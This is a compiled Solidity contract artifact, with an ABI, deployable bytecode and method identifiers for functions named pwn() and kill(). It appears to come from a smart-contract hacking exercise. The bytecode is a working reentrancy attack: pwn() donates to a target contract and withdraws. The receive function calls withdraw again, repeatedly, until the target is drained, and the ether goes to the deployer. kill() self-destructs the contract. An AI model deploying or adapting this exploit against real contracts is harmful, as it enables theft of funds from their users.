{"abi":[{"type":"constructor","inputs":[{"name":"_reentranceAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"kill","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"pwn","inputs":[],"outputs":[],"stateMutability":"payable"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516103553803806103558339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b031992831617905560018054909116331790556102e88061006d6000396000f3fe60806040526004361061002d5760003560e01c806341c0e1b514610191578063dd365b8b146101a65761018c565b3661018c576000546001600160a01b0316311561014f57600054604080517f70a0823100000000000000000000000000000000000000000000000000000000815230600482015290516001600160a01b0390921691632e1a7d4d9183916370a0823191602480820192602092909190829003018186803b1580156100b057600080fd5b505afa1580156100c4573d6000803e3d6000fd5b505050506040513d60208110156100da57600080fd5b5051604080517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b168152600481019290925251602480830192600092919082900301818387803b15801561013257600080fd5b505af1158015610146573d6000803e3d6000fd5b5050505061018a565b6001546040516001600160a01b03909116904780156108fc02916000818181858888f19350505050158015610188573d6000803e3d6000fd5b505b005b600080fd5b34801561019d57600080fd5b5061018a6101ae565b61018a6101bc565b6001546001600160a01b0316ff5b60008054604080517e362a9500000000000000000000000000000000000000000000000000000000815230600482015290516001600160a01b039092169262362a95923492602480820193929182900301818588803b15801561021e57600080fd5b505af1158015610232573d6000803e3d6000fd5b505060008054604080517f2e1a7d4d00000000000000000000000000000000000000000000000000000000815234600482015290516001600160a01b039092169550632e1a7d4d9450602480820194509082900301818387803b15801561029857600080fd5b505af11580156102ac573d6000803e3d6000fd5b5050505056fea26469706673582212204b2236b79fdb416ecc50cdcbc034a396cf87ac8704175d41ad04293353b4c8eb64736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"kill()":"41c0e1b5","pwn()":"dd365b8b"},"id":0}